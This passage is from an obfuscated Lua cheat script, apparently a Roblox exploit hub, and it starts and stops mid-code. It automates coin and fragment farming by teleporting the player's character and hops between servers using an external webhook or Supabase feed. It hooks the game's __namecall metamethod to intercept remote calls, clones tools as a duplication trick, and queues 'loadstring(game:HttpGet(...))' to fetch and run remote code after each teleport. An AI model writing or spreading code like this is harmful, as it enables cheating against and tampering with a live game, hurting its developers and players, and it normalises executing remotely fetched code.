v347:Destroy();v352:Destroy();pcall(function() v344.PlatformStand=false;v341.Animate.Disabled=false;end);v46.tpwalking=false;end);task.spawn(function() while v46.nowe do task.wait();local v1233=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if v1233 then if v46.upHeld then v1233.CFrame=v1233.CFrame * CFrame.new(0,1,0) ;end if v46.downHeld then v1233.CFrame=v1233.CFrame * CFrame.new(0, -1,0) ;end end end end);table.insert(v104,v3.InputBegan:Connect(function(v738,v739) if v739 then return;end if (v738.KeyCode==Enum.KeyCode.W) then v356.f=1;end if (v738.KeyCode==Enum.KeyCode.S) then v356.b= -1;end if (v738.KeyCode==Enum.KeyCode.A) then v356.l= -1;end if (v738.KeyCode==Enum.KeyCode.D) then v356.r=1;end end));table.insert(v104,v3.InputEnded:Connect(function(v740) if (v740.KeyCode==Enum.KeyCode.W) then v356.f=0;end if (v740.KeyCode==Enum.KeyCode.S) then v356.b=0;end if (v740.KeyCode==Enum.KeyCode.A) then v356.l=0;end if (v740.KeyCode==Enum.KeyCode.D) then v356.r=0;end end));end function v103() v46.nowe=false;v46.tpwalking=false;for v741,v742 in ipairs(v104) do v742:Disconnect();end v104={};v101(true);pcall(function() if v40.Character then v40.Character.Animate.Disabled=false;end end);end local v105=(function() local v362={};local v363,v364,v365={},false,nil;local v366={coin=true,coinmodel=true,coin_model=true,goldcoin=true,silvercoin=true,coinpart=true};local function v367(v743) if  not (v743 and v743.Parent) then return;end local v744=v743.Name:lower():gsub("%s+","");local v745=false;for v1234 in pairs(v366) do if ((v744==v1234) or v744:find(v1234,1,true)) then v745=true;break;end end if  not v745 then return;end local v746;if v743:IsA("BasePart") then v746=v743;elseif v743:IsA("Model") then task.wait();v746=v743.PrimaryPart or v743:FindFirstChildWhichIsA("BasePart") ;end if  not v746 then return;end v363[v746]=true;v25.add(v743.AncestryChanged:Connect(function() if  not v743.Parent then v363[v746]=nil;end end),"coin");end local function v368(v748) if ( not v748 or  not v748.Parent) then return;end for v1235,v1236 in ipairs(v748:GetChildren()) do v367(v1236);end v25.add(v748.ChildAdded:Connect(function(v1237) task.wait(0.05);v367(v1237);end),"coin");end v362.start=function() v25.clear("coin");v363={};local v749=v27();if v749 then v368(v749);for v2009,v2010 in ipairs({"CoinRain","Coins","CoinFolder","Events","Collectibles"}) do local v2011=v749:FindFirstChild(v2010);if v2011 then v368(v2011);end end end v368(workspace);for v1238,v1239 in ipairs(workspace:GetDescendants()) do v367(v1239);end v25.add(workspace.DescendantAdded:Connect(function(v1240) task.wait(0.05);v367(v1240);end),"coin");end;v362.stop=function() v364=false;if v365 then pcall(task.cancel,v365);v365=nil;end v25.clear("coin");v363={};end;v362.coins=function() local v750={};for v1241 in pairs(v363) do if (v1241 and v1241.Parent) then table.insert(v750,v1241);else v363[v1241]=nil;end end return v750;end;v362.isActive=function() return v364;end;v362.collect=function(v751,v752) if v364 then return;end v364=true;v365=task.spawn(function() local v1242=tick() + (v751 or 90) ;local v1243=0;while v364 do local v1730=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v1730 then task.wait(0.3);continue;end local v1731=v362.coins();if ( #v1731==0) then v1243+=1 if ((tick()>v1242) and (v1243>8)) then break;end v1.Heartbeat:Wait();continue;end v1243=0;v1242=math.max(v1242,tick() + 10 );table.sort(v1731,function(v2013,v2014) local v2015=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v2015 then return false;end return (v2013.Position-v2015.Position).Magnitude<(v2014.Position-v2015.Position).Magnitude ;end);for v2016,v2017 in ipairs(v1731) do if  not v364 then break;end if  not (v2017 and v2017.Parent) then continue;end v1730=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v1730 then break;end v68(CFrame.new(v2017.Position + Vector3.new(0,2.5,0) ));v17(v1730,v2017,0);task.wait(0.45);end end v364=false;v365=nil;pcall(function() local v1732=v40.Character and v40.Character:FindFirstChildOfClass("Humanoid") ;local v1733=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if (v1732 and v1733) then v1732.PlatformStand=false;v1732:ChangeState(Enum.HumanoidStateType.Running);end end);if v752 then pcall(v752);end end);end;return v362;end)();local function v106() v105.start();end local function v107() v105.stop();end local function v108() return v105.coins();end local v109=false;local v110=false;local v111=false;local v112=nil;local function v113() v105.stop();v109=false;v111=true;v112={};v105.collect(v46.coinEventDuration,function() v111=false;v112=nil;pcall(function() local v1244=v40.Character and v40.Character:FindFirstChildOfClass("Humanoid") ;local v1245=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if (v1244 and v1245) then v1244.PlatformStand=false;v1244:ChangeState(Enum.HumanoidStateType.Running);end end);if (v46.autoHopCoinEnabled and v46.autoCoinEnabled and  not v109 and  not getgenv().OxyoHopStopped) then v109=true;v110=true;v38:Notify({Title="Auto Hop",Content="Coin Rain ended — hopping...",Duration=2,Image=4483362458});task.wait(1);if ( not getgenv().OxyoHopStopped and v46.autoHopCoinEnabled) then getgenv().OxyoAutoHopCoin=true;task.spawn(function() _TPE.hopRandom();end);end v110=false;end end);end local v114=(function() local v374,v375={},v6;local v376=4;local v377={2,4,8,15};local v378={[771]=true,[769]=true};local v379={[772]=true,[773]=true,[770]=true,[774]=true};local v380,v381,v382,v383={},false,0,3.5;local function v384(v753) if getgenv().OxyoExecQueued then return;end getgenv().OxyoExecQueued=true;local v755='loadstring(game:HttpGet("'   .. v753   .. '"))()' ;pcall(function() if (typeof(queue_on_teleport)=="function") then queue_on_teleport(v755);end end);pcall(function() if ((typeof(syn)=="table") and (typeof(syn.queue_on_teleport)=="function")) then syn.queue_on_teleport(v755);end end);pcall(function() if ((typeof(fluxus)=="table") and (typeof(fluxus.queue_on_teleport)=="function")) then fluxus.queue_on_teleport(v755);end end);end local function v385(v756,v757) local v758=v383-(tick() -v382) ;if (v758>0) then task.wait(v758);end v382=tick();for v1246=1,v376 do local v1247,v1248=pcall(function() v375:TeleportToPlaceInstance(v756,v757,v0.LocalPlayer);end);if v1247 then return true,nil;end local v1249=tonumber(tostring(v1248):match("(%d+)")) or 0 ;if v378[v1249] then return false,"fatal:"   .. v1249 ;end if (v1246<v376) then local v2019=v377[v1246] or 10 ;if v379[v1249] then v2019=v2019 * 1.5 ;end task.wait(v2019);end end return false,"max_retries";end local function v386() if v381 then return;end v381=true;task.spawn(function() while  #v380>0  do local v1734=table.remove(v380,1);if ((tick() -v1734.at)>120) then continue;end v384(v19);getgenv().OxyoHubLoaded=false;v385(v1734.placeId,v1734.jobId);if v1734.onFail then end task.wait(1);end v381=false;end);end v374.hop=function(v759,v760) if  not v759 then return;end table.insert(v380,{placeId=v21,jobId=v759,at=tick(),onFail=v760});v386();end;v374.hopRandom=function(v761) task.spawn(function() local v1250=game:GetService("HttpService");local v1251={};local v1252="";for v1736=1,6 do local v1737="https://games.roblox.com/v1/games/"   .. v21   .. "/servers/Public?sortOrder=Asc&limit=100" ;if (v1252~="") then v1737=v1737   .. "&cursor="   .. v1252 ;end local v1738,v1739=pcall(function() return game:HttpGet(v1737);end);if ( not v1738 or  not v1739) then break;end local v1740,v1741=pcall(v1250.JSONDecode,v1250,v1739);if ( not v1740 or  not v1741 or  not v1741.data) then break;end for v2020,v2021 in ipairs(v1741.data) do if ((v2021.id~=v22) and (v2021.playing<v2021.maxPlayers)) then table.insert(v1251,v2021.id);end end if ( #v1251>=5) then break;end if (v1741.nextPageCursor and (v1741.nextPageCursor~="")) then v1252=v1741.nextPageCursor;task.wait(0.08);else break;end end if ( #v1251==0) then task.wait(math.random(6,12));v374.hopRandom(v761);return;end local v1253=v1251[math.random(1,math.min( #v1251,5))];v374.hop(v1253,v761);end);end;v374.clear=function() v380={};end;return v374;end)();local function v115() if (v23() or  not v24()) then return;end v114.hopRandom(function() if (v23() or  not v24()) then return;end task.wait(math.random(5,10));task.spawn(v115);end);end local function v116() task.spawn(v115);end local function v117(v390,v391) if (v390 and  not getgenv()[v390]) then return;end if (v391 and getgenv()[v391]) then return;end v114.hopRandom();end local function v118(v392) if (v392 and (v392~=v22)) then v114.hop(v392);else v114.hopRandom();end end local v119=1.5;local v120=10;local v121,v122={},{};local function v123(v393,v394,v395,v396) local v397=(v393 or "")   .. "|"   .. (v394 or "")   .. "|"   .. (v395 or "")   .. "|"   .. (v396 or "") ;local v398=tick();if (v121[v397] and ((v398-(v122[v397] or 0))<3)) then return v121[v397].j,v121[v397].e;end local v399,v400=v11(v393,v394,nil,v395,v396);v121[v397]={j=v399,e=v400};v122[v397]=v398;return v399,v400;end local function v124(v403,v404,v405,v406,v407) local v408=0;v38:Notify({Title=v407   .. " Waiting: "   .. v406 ,Content="Scanning webhook — will hop the moment one's found...",Duration=5,Image=4483362458});while getgenv()[v404] and  not getgenv()[v405]  do local v762=v92(v403,180);if v762 then v38:Notify({Title=v407   .. " "   .. v406   .. " Found!" ,Content="Hopping now...",Duration=4,Image=4483362458});task.wait(0.5);if (getgenv()[v404] and  not getgenv()[v405]) then v114.hop(v762);end return;end v408+=1 if ((v408%v120)==0) then v38:Notify({Title="🔍 Still waiting: "   .. v406 ,Content="No webhook yet — checking every 1.5s...",Duration=3,Image=4483362458});end task.wait(v119);end end local function v125(v409,v410) local v411=0;local v412="";v38:Notify({Title="🔍 Brainrot Hunt",Content="Scanning Supabase — will hop the moment it's found...",Duration=5,Image=4483362458});while getgenv()[v409] and  not getgenv()[v410]  do local v763=getgenv()._wwhBrName or "" ;local v764=getgenv()._wwhBrRarity;local v765=getgenv()._wwhBrMutation;local v766=getgenv()._wwhBrTrait;if (v763=="") then task.wait(1);continue;end local v767,v768=v123(v763,v764,v765,v766);if (v767 and v768) then local v1742=(v768.m and (" ["   .. v768.m   .. "]")) or "" ;v38:Notify({Title="✅ Found: "   .. v768.n   .. v1742 ,Content="Hopping now...",Duration=5,Image=4483362458});task.wait(0.5);if (getgenv()[v409] and  not getgenv()[v410]) then v114.hop(v767);end return;end v411+=1 local v769=((v411%v120)==0) or (v412~=v763) ;if v769 then v412=v763;v38:Notify({Title="🔍 Hunting: "   .. v763 ,Content="Not found yet — checking every 1.5s...",Duration=3,Image=4483362458});end task.wait(v119);end end local v126={{id="coin",kind="coin",label="🪙 Coin Rain"},{id="celestial",kind="rarity",label="🌌 Celestial",rarity="Celestial"},{id="godly",kind="rarity",label="👑 Godly",rarity="Godly"},{id="secret",kind="rarity",label="🔮 Secret",rarity="Secret"},{id="mythic",kind="rarity",label="🌟 Mythic",rarity="Mythic"},{id="legendary",kind="rarity",label="✨ Legendary",rarity="Legendary"},{id="frag",kind="frag",label="🔷 Fragments"}};local v127,v128={},{};for v413,v414 in ipairs(v126) do v127[v414.id]=v414;v128[v414.label]=v414.id;end local v129={active=false,thread=nil,sel={},namedBr="",namedRar=nil,loopFn=nil};local v130,v131;local function v132(v418) return (v418 or ""):lower():gsub("[%s%p]","");end local function v133() local v419,v420=pcall(function() return require(game:GetService("ReplicatedStorage").Modules.EventTimerController);end);if ( not v419 or  not v420 or  not v420.OnGoingTimers) then return nil,0;end local function v421(v770) return tostring(v770):gsub("<[^>]+>","");end for v771,v772 in pairs(v420.OnGoingTimers) do local v773=v772.UI;if (typeof(v773)~="Instance") then continue;end local v774=tonumber(v772.TimeRemaining) or 0 ;for v1254,v1255 in ipairs({"NameLabel","Title"}) do local v1256=v773:FindFirstChild(v1255);if (v1256 and v1256:IsA("TextLabel") and v421(v1256.Text):find("Coin Rain")) then return "active",v774;end end end return nil,0;end local function v134() for v775,v776 in ipairs(workspace:GetDescendants()) do if  not v776.Parent then continue;end local v777=v776.Name:lower();if ((v777:find("fragment") or (v777=="frag")) and (v776:IsA("BasePart") or v776:IsA("Model"))) then return true;end end return false;end local function v135(v422,v423,v424) if (type(v422)~="table") then return  -1,{};end if ((v424-(v422.t or 0))>50) then return  -1,{};end if ( not v422.j or  not v423[v422.j]) then return  -1,{};end local v425,v426,v427=0,{},((type(v422.b)=="table") and v422.b) or {} ;for v778,v779 in ipairs(v129.sel) do local v780=v127[v779];if  not v780 then continue;end local v781=(( #v129.sel-v778) + 1) * 12 ;if (v779=="coin") then if v422.coinRain then v425+=(v781 + 60) table.insert(v426,{def=v780,pri=v778});end elseif (v780.kind=="rarity") then for v2351,v2352 in ipairs(v427) do if (v2352.r and (v2352.r:lower()==v780.rarity:lower())) then local v2479=0;if (v2352.m and (v2352.m~="") and (v2352.m~="Normal")) then v2479+=15 end if ((type(v2352.t)=="table") and ( #v2352.t>0)) then v2479+=8 end v425+=(v781 + v2479) table.insert(v426,{def=v780,pri=v778,sample=v2352});break;end end elseif (v779=="frag") then if v422.hasFrag then v425+=(v781 + 35) table.insert(v426,{def=v780,pri=v778});end end end if (v129.namedBr~="") then local v1257=v132(v129.namedBr);local v1258=v129.namedRar and v129.namedRar:lower() ;for v1743,v1744 in ipairs(v427) do local v1745=v132(v1744.n);if ((v1745==v1257) or v1745:find(v1257,1,true) or v1257:find(v1745,1,true)) then if ( not v1258 or (v1744.r and (v1744.r:lower()==v1258))) then v425+=300 table.insert(v426,{def={id="named",kind="rarity",rarity=v1744.r,label="🎯 "   .. (v1744.n or "?") },pri=0,sample=v1744});break;end end end end return v425,v426;end local function v136() local v428=v34.call("GET","sv",nil,8);if (type(v428)~="table") then return nil,nil,nil;end local v429=v34.pubIds(true);local v430=os.time();local v431={score= -1,job=nil,matched=nil};local v432=nil;for v782,v783 in pairs(v428) do if (type(v783)~="table") then continue;end if (v783.j==game.JobId) then continue;end if ((v430-(v783.t or 0))>60) then continue;end if ( not v783.j or  not v429[v783.j]) then continue;end if  not v432 then v432=v783.j;end local v784,v785=v135(v783,v429,v430);if (v784>v431.score) then v431.score=v784;v431.job=v783.j;v431.matched=v785;end end if (v431.score>0) then return v431.job,v431.matched,v432;end return nil,nil,v432;end local function v137() local v433={};for v786,v787 in ipairs(v129.sel) do local v788=v127[v787];if  not v788 then continue;end if (v787=="coin") then local v1751,v1752=v133();if ((v1751=="active") and ((v1752 or 0)>5)) then table.insert(v433,{def=v788,pri=v786,tl=v1752});end elseif (v788.kind=="rarity") then local v2198=v30(v788.rarity);if (v2198 and ( #v2198:GetChildren()>0)) then table.insert(v433,{def=v788,pri=v786});end elseif (v787=="frag") then if v134() then table.insert(v433,{def=v788,pri=v786});end end end if (v129.namedBr~="") then local v1259=v132(v129.namedBr);local v1260=v129.namedRar and v129.namedRar:lower() ;for v1753,v1754 in ipairs(v50.brainrots) do if (v1754.obj and v1754.obj.Parent) then local v2199=v132(v1754.name);if ((v2199==v1259) or v2199:find(v1259,1,true)) then if ( not v1260 or (v1754.rarity:lower()==v1260)) then table.insert(v433,{def={id="named",kind="rarity",rarity=v1754.rarity,label="🎯 "   .. v1754.name },pri=0,entry=v1754});break;end end end end end table.sort(v433,function(v789,v790) return v789.pri<v790.pri ;end);return v433;end local function v138(v434) table.sort(v434,function(v791,v792) return v791.pri<v792.pri ;end);local v435={};for v793,v794 in ipairs(v434) do if  not v129.active then break;end local v795=v794.def.id;if v435[v795] then continue;end v435[v795]=true;if (v795=="coin") then v72();v46.autoCoinEnabled=true;v106();v46.coinEventDuration=v794.tl or 60 ;v113();local v1757=tick() + (v794.tl or 60) + 8 ;while (tick()<v1757) and v129.active and v111  do task.wait(1);end v105.stop();v111=false;v112=nil;v46.autoCoinEnabled=false;v107();elseif (v794.def.kind=="rarity") then v72();if (v795=="named") then local v2422=v794.entry;if (v2422 and v2422.obj and v2422.obj.Parent) then pcall(v82,v2422.obj);pcall(v83);task.wait(0.5);end else local v2423=v30(v794.def.rarity);if v2423 then local v2523={};for v2553,v2554 in ipairs(v2423:GetChildren()) do if (v2554 and v2554.Parent) then table.insert(v2523,v2554);end end for v2555,v2556 in ipairs(v2523) do if  not v129.active then break;end if (v2556 and v2556.Parent) then pcall(v82,v2556);pcall(v83);task.wait(0.3);end end end end elseif (v795=="frag") then v72();local v2424={};local v2425={};for v2480,v2481 in ipairs(workspace:GetDescendants()) do if  not (v2481 and v2481.Parent) then continue;end local v2482=v2481.Name:lower();if  not (v2482:find("fragment") or (v2482=="frag")) then continue;end if  not (v2481:IsA("BasePart") or v2481:IsA("Model")) then continue;end local v2483=false;local v2484=v2481.Parent;while v2484 and (v2484~=workspace)  do if v2425[v2484] then v2483=true;break;end v2484=v2484.Parent;end if  not v2483 then v2425[v2481]=true;table.insert(v2424,v2481);end end local v2426=0;for v2485,v2486 in ipairs(v2424) do if  not v129.active then break;end local v2487=(v2486:IsA("BasePart") and v2486) or v2486.PrimaryPart or v2486:FindFirstChildWhichIsA("BasePart") ;if  not v2487 then continue;end local v2488=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v2488 then break;end v68(v2487.CFrame * CFrame.new(0,4,0) );task.wait(0.15);v2488=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if v2488 then pcall(function() v2488.CFrame=CFrame.new(v2487.Position + Vector3.new(0,3,0) );end);task.wait(0.2);v17(v2488,v2487,0);task.wait(0.05);end v2426+=1 task.wait(0.3);end if (v2426>0) then pcall(function() local v2558=game:GetService("ReplicatedStorage");local v2559=v2558:FindFirstChild("SubmitFragment");if v2559 then v2559:FireServer();end end);pcall(v83);end end end end local function v139() v72();task.wait(8);if  not v129.active then return;end local v436=v137();if ( #v436>0) then v138(v436);end while v129.active do local v797=v137();if ( #v797>0) then local v1758={};for v2022,v2023 in ipairs(v797) do table.insert(v1758,v2023.def.label);end v38:Notify({Title="✅ Match HERE!",Content=table.concat(v1758," + ")   .. "\nFarming now..." ,Duration=4,Image=4483362458});v138(v797);task.wait(2);if  not v129.active then break;end continue;end v38:Notify({Title="🔍 Smart Hop",Content="Scanning webhook for matching server...",Duration=2,Image=4483362458});local v798=nil;for v1261,v1262 in ipairs(v129.sel) do local v1263=v127[v1262];if  not v1263 then continue;end local v1264=((v1262=="coin") and 90) or 180 ;local v1265=v92(v1262,v1264);if v1265 then v798=v1265;break;end end if ( not v798 and (v129.namedBr~="")) then v798=v92(v129.namedBr:lower():sub(1,6),180);end if  not v129.active then break;end if v798 then v38:Notify({Title="🎯 Webhook — Server Found!",Content="Event still active — hopping in 2s...",Duration=5,Image=4483362458});getgenv().OxyoSHEActive=true;getgenv().OxyoSHESel=v129.sel;getgenv().OxyoSHEBr=v129.namedBr;getgenv().OxyoSHEBrRar=v129.namedRar;task.wait(2);if  not v129.active then break;end v114.hop(v798);task.wait(6);else v38:Notify({Title="⏳ Smart Hop",Content="No matching server yet — waiting for webhook...",Duration=3,Image=4483362458});for v2024=1,12 do task.wait(0.5);if  not v129.active then return;end end end end end v129.loopFn=v139;local function v141() if (( #v129.sel==0) and (v129.namedBr=="")) then v38:Notify({Title="Smart Hop",Content="Enable at least one event target!",Duration=3,Image=4483362458});return false;end if v129.active then return true;end v129.active=true;getgenv().OxyoSHEActive=true;v130();v129.thread=task.spawn(v139);return true;end local function v142() v129.active=false;getgenv().OxyoSHEActive=false;if v129.thread then pcall(task.cancel,v129.thread);v129.thread=nil;end v105.stop();v111=false;v112=nil;v46.autoCoinEnabled=false;v107();pcall(function() local v799=game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui");if v799 then v799:Destroy();end end);end task.spawn(function() if (getgenv().OxyoSHEActive~=true) then return;end local v443=getgenv().OxyoSHESel;local v444=getgenv().OxyoSHEBr or "" ;local v445=getgenv().OxyoSHEBrRar;if (( not v443 or ( #v443==0)) and (v444=="")) then return;end v129.sel=v443 or {} ;v129.namedBr=v444;v129.namedRar=v445;v129.active=true;v72();task.wait(6);v130();v129.thread=task.spawn(v139);end);v3.InputBegan:Connect(function(v451,v452) if v452 then return;end if (v451.KeyCode==Enum.KeyCode.Q) then v46.upHeld=true;end if (v451.KeyCode==Enum.KeyCode.E) then v46.downHeld=true;end if (v451.KeyCode==Enum.KeyCode.RightShift) then if (v129.active or getgenv().OxyoAutoHopCoin or getgenv().OxyoAutoHopGodly or getgenv().OxyoAutoHopCel or getgenv().OxyoAutoHopFrag) then v131();end end end);v3.InputEnded:Connect(function(v453) if (v453.KeyCode==Enum.KeyCode.Q) then v46.upHeld=false;end if (v453.KeyCode==Enum.KeyCode.E) then v46.downHeld=false;end end);local function v143() local v454=v40.Character;if  not v454 then return false,"No character found.";end local v455=nil;for v800,v801 in ipairs(v454:GetChildren()) do if v801:IsA("Tool") then v455=v801;break;end end if  not v455 then return false,"No Brainrot equipped.";end local v456=v40:FindFirstChild("Backpack");if  not v456 then return false,"No backpack found.";end local v457=v455:Clone();v457.Parent=v456;local v459=v454:FindFirstChildOfClass("Humanoid");if v459 then v459:UnequipTools();end return true,"Duplicated: "   .. v455.Name ;end local function v144() local v460=0;local v461=v40:FindFirstChild("Backpack");if v461 then for v1766,v1767 in pairs(v461:GetChildren()) do if v1767:IsA("Tool") then v460+=1 end end end local v462=v40.Character;if v462 then for v1768,v1769 in pairs(v462:GetChildren()) do if v1769:IsA("Tool") then v460+=1 end end end return v460;end local function v145() local v463=v4:FindFirstChild("Events");if  not v463 then return nil;end local v464=v463:FindFirstChild("SellDialogue");if v464 then return v464;end for v802,v803 in pairs(v463:GetChildren()) do if v803.Name:lower():find("sell") then return v803;end end return nil;end local function v146() local v465=v145();if  not v465 then return false;end local v466,v467=pcall(function() if v465:IsA("RemoteFunction") then v465:InvokeServer("SellAll");elseif v465:IsA("RemoteEvent") then v465:FireServer("SellAll");end end);if  not v466 then end return v466;end local function v147(v468) if v46.countConn then v46.countConn:Disconnect();end playerPlot=v468;v46.collectedCount=0;local v470=v468:FindFirstChild("Brainrots");if  not v470 then return;end v46.countConn=v470.ChildAdded:Connect(function(v804) if v804:IsA("Model") then v46.collectedCount+=1 end end);end local function v148(v472) return (math.abs(v472.X)<5000) and (math.abs(v472.Y)<5000) and (math.abs(v472.Z)<5000) ;end local function v149() local v473=workspace:FindFirstChild("GameFolder");local v474=v473 and v473:FindFirstChild("LuckyBlocks") ;if  not v474 then return {};end local v475={};for v805,v806 in ipairs(v474:GetChildren()) do local v807=v806:FindFirstChildWhichIsA("ProximityPrompt",true);local v808=false;local v809=Vector3.new(0,0,0);if v807 then v809=v807.Parent.Position;v808=v148(v809);end table.insert(v475,{name=v806.Name,active=v808,pos=v809,block=v806,pp=v807});end return v475;end local function v150(v476) if (v51.luckyType=="All") then return true;end local v477=v476:lower();local v478=v51.luckyType:lower();return (v477==v478) or (v477:find(v478,1,true)~=nil) or (v478:find(v477,1,true)~=nil) ;end local function v151(v479) if ( not v51.luckyTraits or ( #v51.luckyTraits==0)) then return true;end local v480=v46.traitData[v479];if ( not v480 or ( #v480.traitNames==0)) then return false;end for v810,v811 in ipairs(v51.luckyTraits) do for v1271,v1272 in ipairs(v480.traitNames) do if (v1272==v811) then return true;end end end return false;end local function v152(v481) if  not v51.luckyEnabled then return;end if  not v150(v481.Name) then return;end if  not v151(v481) then return;end pcall(function() local v812=v481:FindFirstChildWhichIsA("ProximityPrompt",true);if  not v812 then return;end local v813=v812.Parent.Position;if  not v148(v813) then return;end local v814=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v814 then return;end v814.CFrame=CFrame.new(v813 + Vector3.new(0,3,3) );task.wait(0.3);v16(v812);task.wait(0.5);v814.CFrame=v79();end);end local v153={SUCCESS="success",OUT_OF_STOCK="out_of_stock",NO_COINS="no_coins",NOT_IN_SHOP="not_in_shop"};local v154=v4:WaitForChild("Events",10) and v4.Events:WaitForChild("VendorPurchase",10) ;local function v155() local v482=workspace:FindFirstChild("GameFolder") and workspace.GameFolder:FindFirstChild("Shops") and workspace.GameFolder.Shops:FindFirstChild("Vendor") ;return v482 and v482:FindFirstChild("GearsAccess") ;end local v156={};local v157=0;local function v158(v483) return tostring(v483):lower():gsub("%s+",""):gsub("%d+$","");end local function v159(v484,v485,v486,v487) local v488=tostring(v484):lower();local v489=v158(v484);v156[v488]={inStock=v485,stock=v486 or 0 ,manual=v487 or false };if v485 then local v1273={};for v1771,v1772 in pairs(v156) do if ((v1771~=v488) and  not v1772.inStock and (v158(v1771)==v489)) then table.insert(v1273,v1771);end end for v1773,v1774 in ipairs(v1273) do v156[v1774]=nil;end end end local function v160() local v491,v492=pcall(function() return v4:WaitForChild("Remotes",5) and v4.Remotes:WaitForChild("StockGameService",5) and v4.Remotes.StockGameService:WaitForChild("ReplicateStockData",5) ;end);if ( not v491 or  not v492) then return;end v492.OnClientEvent:Connect(function(v816) if (type(v816)~="table") then return;end local function v817(v1274,v1275) if (type(v1275)=="table") then for v2200,v2201 in pairs(v1275) do if (type(v2201)=="table") then local v2427=(v2201.inStock~=false) and ((tonumber(v2201.stock) or 0)>0) ;v159(v2200,v2427,tonumber(v2201.stock) or 0 );elseif ((type(v2201)=="boolean") or (type(v2201)=="number")) then local v2525=(v2201==true) or ((type(v2201)=="number") and (v2201>0)) ;local v2526=((type(v2201)=="number") and v2201) or (v2201 and 1) or 0 ;v159(v2200,v2525,v2526);end end elseif ((type(v1275)=="boolean") or (type(v1275)=="number")) then local v2353=(v1275==true) or ((type(v1275)=="number") and (v1275>0)) ;local v2354=((type(v1275)=="number") and v1275) or (v1275 and 1) or 0 ;v159(v1274,v2353,v2354);end end for v1276,v1277 in pairs(v816) do v817(v1276,v1277);end end);end task.spawn(v160);local v161=nil;local function v162() if (v161 and v161.Parent) then local v1278=v161.Text:gsub("<[^>]+>","");local v1279,v1280,v1281=v1278:match("(%d+):(%d+):(%d+)");if v1279 then return (tonumber(v1279) * 3600) + (tonumber(v1280) * 60) + tonumber(v1281) ;end local v1282,v1283=v1278:match("(%d+):(%d+)");if v1282 then return (tonumber(v1282) * 60) + tonumber(v1283) ;end return nil;end local v493=v0.LocalPlayer:FindFirstChild("PlayerGui");if  not v493 then return nil;end local function v494(v818,v819) if (v819>5) then return nil;end if ((v818.Name=="Vendor") and v818:IsA("Frame")) then local v1776=v818:FindFirstChild("Main");local v1777=v1776 and v1776:FindFirstChild("Timer") ;if (v1777 and v1777:IsA("TextLabel")) then v161=v1777;local v2202=v1777.Text:gsub("<[^>]+>","");local v2203,v2204,v2205=v2202:match("(%d+):(%d+):(%d+)");if v2203 then return (tonumber(v2203) * 3600) + (tonumber(v2204) * 60) + tonumber(v2205) ;end local v2206,v2207=v2202:match("(%d+):(%d+)");if v2206 then return (tonumber(v2206) * 60) + tonumber(v2207) ;end end end for v1284,v1285 in ipairs(v818:GetChildren()) do local v1286=v494(v1285,v819 + 1 );if v1286 then return v1286;end end end for v820,v821 in ipairs(v493:GetChildren()) do local v822=v494(v821,0);if v822 then return v822;end end return nil;end task.spawn(function() local v495=nil;while true do task.wait(10);local v823=v162();if v823 then if (v495 and (v495<90) and (v823>1200)) then v157=tick();local v2208={};for v2355,v2356 in pairs(v156) do if (v2356.manual and  not v2356.inStock) then table.insert(v2208,v2355);end end for v2357,v2358 in ipairs(v2208) do v156[v2358]=nil;end pcall(function() v38:Notify({Title="🔄 Shop Restocked!",Content="Auto Buy resumed — stock flags cleared.",Duration=4,Image=4483362458});end);end v495=v823;end end end);local v163={};local function v164() if ( not v18 or  not v154) then return;end pcall(function() local v824=getrawmetatable(game);local v825=rawget(v824,"__namecall");if  not v825 then return;end setreadonly(v824,false);local v826=v824.__namecall;v824.__namecall=newcclosure(function(v1287,...) local v1288=getnamecallmethod();if ((v1288=="FireServer") and (v1287==v154)) then local v2025={...};if (v2025[1]~=nil) then local v2360=tostring(v2025[1]);v163[v2360:lower()]=v2360;end end return v826(v1287,...);end);setreadonly(v824,true);end);end task.spawn(v164);local function v165(v496) if (type(v496)=="number") then return v496;end v496=tostring(v496):gsub(",",""):gsub("%s","");local v497={K=1000,M=1000000,B=1000000000,T=999999995904,Qd=999999986991104,Qn=1000000000000000000,Sx=1e+21,Sp=1e+24,Oc=1e+27,No=1e+30,Dc=1e+33};local v498={};for v828 in pairs(v497) do table.insert(v498,v828);end table.sort(v498,function(v829,v830) return  #v829> #v830 ;end);for v831,v832 in ipairs(v498) do local v833=v496:match("^(%-?%d+%.?%d*)"   .. v832   .. "$" );if v833 then return (tonumber(v833) or 0) * v497[v832] ;end end return tonumber(v496) or 0 ;end local function v166() local v499=v40:FindFirstChild("leaderstats");if  not v499 then return math.huge;end local v500=v499:FindFirstChild("Coins") or v499:FindFirstChild("Coin") or v499:FindFirstChild("Cash") ;if  not v500 then return math.huge;end return v165(v500.Value);end local function v167(v501) local v502=v501.displayName:lower();local v503=v158(v501.displayName);if v163[v502] then return v163[v502];end for v834,v835 in pairs(v163) do local v836=v158(v834);if ((v836==v503) or v836:find(v503,1,true) or v503:find(v836,1,true)) then return v835;end end return v501.serverKey;end local function v168(v504) local v505=v52[v504];if  not v505 then return v153.NOT_IN_SHOP;end local v506=v154;if  not v506 then return v153.NOT_IN_SHOP;end do local v837=v158(v505.displayName);local v838=v158(v505.serverKey);for v1289,v1290 in pairs(v156) do if (v1290.manual and  not v1290.inStock) then local v2026=v158(v1289);if ((v2026==v837) or (v2026==v838) or v2026:find(v838,1,true) or v838:find(v2026,1,true)) then return v153.OUT_OF_STOCK;end end end end if ((v505.coinPrice>0) and (v166()<v505.coinPrice)) then return v153.NO_COINS;end local v507=v167(v505);local v508=v166();local v509={};local function v510(v839) if  not v839 then return;end for v1291,v1292 in pairs(v839:GetChildren()) do if v1292:IsA("Tool") then v509[v1292]=true;end end end local v511=v40:FindFirstChild("Backpack");local v512=v40.Character;v510(v511);v510(v512);local v513=false;local v514="";local v515={};local function v516(v840) if  not v840:IsA("Tool") then return;end if v509[v840] then return;end v513=true;end if v511 then table.insert(v515,v511.ChildAdded:Connect(v516));end if v512 then table.insert(v515,v512.ChildAdded:Connect(v516));end local v517=v4:FindFirstChild("Events") and v4.Events:FindFirstChild("Notification") ;if v517 then 